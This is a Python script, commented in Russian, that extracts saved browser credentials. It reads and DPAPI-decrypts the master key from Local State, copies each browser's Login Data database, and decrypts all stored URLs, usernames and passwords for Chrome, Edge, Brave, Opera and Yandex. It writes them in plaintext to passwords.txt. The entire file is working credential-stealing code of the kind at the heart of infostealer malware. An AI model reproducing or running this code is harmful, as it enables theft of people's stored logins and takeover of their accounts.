import os
import sqlite3
import win32crypt
import json
import base64
import shutil
from Crypto.Cipher import AES

def get_encryption_key(browser_path):
    """Получаем ключ шифрования из Local State"""
    local_state_path = os.path.join(browser_path, "Local State")
    
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Удаляем префикс DPAPI
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Ошибка получения ключа: {e}")
        return None

def decrypt_password(ciphertext, key):
    """Расшифровываем пароль используя AES-GCM"""
    try:
        if not ciphertext or len(ciphertext) < 15:
            return ""
            
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]  # Удаляем auth tag
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password).decode('utf-8')
    except Exception:
        # Пробуем старый метод DPAPI
        try:
            return str(win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1])
        except:
            return ""

def get_chrome_passwords(browser_path):
    """Получаем пароли из указанного браузера"""
    secret_key = get_encryption_key(browser_path)
    if not secret_key:
        print("Не удалось получить ключ шифрования")
        return []

    passwords = []
    login_data_path = os.path.join(browser_path, "Default", "Login Data")
    
    if not os.path.exists(login_data_path):
        return []

    # Копируем файл чтобы избежать блокировки
    temp_db = os.path.join(os.getenv("temp"), "temp_login.db")
    shutil.copy2(login_data_path, temp_db)
    
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url, username, ciphertext = row
            if url and username and ciphertext:
                password = decrypt_password(ciphertext, secret_key)
                if password:
                    passwords.append({
                        'url': url,
                        'username': username,
                        'password': password
                    })
    except Exception as e:
        print(f"Ошибка обработки базы данных: {e}")
    finally:
        if 'conn' in locals():
            conn.close()
        if os.path.exists(temp_db):
            os.remove(temp_db)
    
    return passwords

def save_passwords_to_file(passwords, filename="passwords.txt"):
    """Сохраняем пароли в файл"""
    with open(filename, "w", encoding="utf-8") as f:
        for pwd in passwords:
            f.write(f"URL: {pwd['url']}\n")
            f.write(f"Логин: {pwd['username']}\n")
            f.write(f"Пароль: {pwd['password']}\n")
            f.write("-" * 50 + "\n")

def main():
    # Список путей к браузерам
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data")
    }

    all_passwords = []
    
    for name, path in browsers.items():
        if os.path.isdir(path):
            print(f"Поиск паролей в {name}...")
            passwords = get_chrome_passwords(path)
            if passwords:
                print(f"Найдено {len(passwords)} паролей в {name}")
                all_passwords.extend(passwords)
    
    if all_passwords:
        save_passwords_to_file(all_passwords)
        print(f"Все пароли сохранены в passwords.txt")
    else:
        print("Пароли не найдены")

if __name__ == "__main__":
    main()